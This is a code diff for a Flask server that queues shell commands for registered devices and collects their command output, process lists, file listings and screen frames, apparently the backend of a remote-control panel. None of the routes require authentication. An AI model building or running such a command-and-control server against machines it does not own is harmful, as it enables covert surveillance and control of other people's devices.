@@ -1,12 +1,15 @@
 from flask import Flask, request, jsonify
 from flask_cors import CORS
-import time
 
 app = Flask(__name__)
 CORS(app, origins=["http://localhost:3000", "https://python-backend-y3ul.onrender.com"])
 
 devices = []
-frames = {}  # device name -> base64 jpeg
+frames = {}
+commands = {}
+cmd_results = {}
+processes = {}
+files = {}
 
 @app.route('/')
 def home():
@@ -22,8 +25,59 @@ def add_device():
     return jsonify({"ok": True})
 
 @app.route('/api/command', methods=['POST'])
-def command():
-    return jsonify({"ok": True, "output": "command received"})
+def send_command():
+    data = request.json
+    device = data.get('device_id') or data.get('device')
+    cmd = data.get('command', '')
+    commands.setdefault(device, []).append(cmd)
+    return jsonify({"ok": True})
+
+@app.route('/api/commands', methods=['GET'])
+def get_commands():
+    device = request.args.get('device')
+    cmds = commands.pop(device, [])
+    return jsonify({"commands": cmds})
+
+@app.route('/api/command_result', methods=['POST'])
+def post_result():
+    data = request.json
+    device = data.get('device')
+    output = data.get('output', '')
+    cmd_results[device] = output
+    return jsonify({"ok": True})
+
+@app.route('/api/command_result', methods=['GET'])
+def get_result():
+    device = request.args.get('device')
+    return jsonify({"output": cmd_results.get(device, "")})
+
+@app.route('/api/processes', methods=['GET'])
+def get_processes():
+    device = request.args.get('device')
+    return jsonify({"processes": processes.get(device, [])})
+
+@app.route('/api/processes', methods=['POST'])
+def post_processes():
+    data = request.json
+    device = data.get('device')
+    processes[device] = data.get('processes', [])
+    return jsonify({"ok": True})
+
+@app.route('/api/files', methods=['GET'])
+def get_files():
+    device = request.args.get('device')
+    path = request.args.get('path', '.')
+    key = device + ':' + path
+    return jsonify({"files": files.get(key, [])})
+
+@app.route('/api/files', methods=['POST'])
+def post_files():
+    data = request.json
+    device = data.get('device')
+    path = data.get('path', '.')
+    key = device + ':' + path
+    files[key] = data.get('files', [])
+    return jsonify({"ok": True})
 
 @app.route('/api/frame', methods=['POST'])
 def upload_frame():
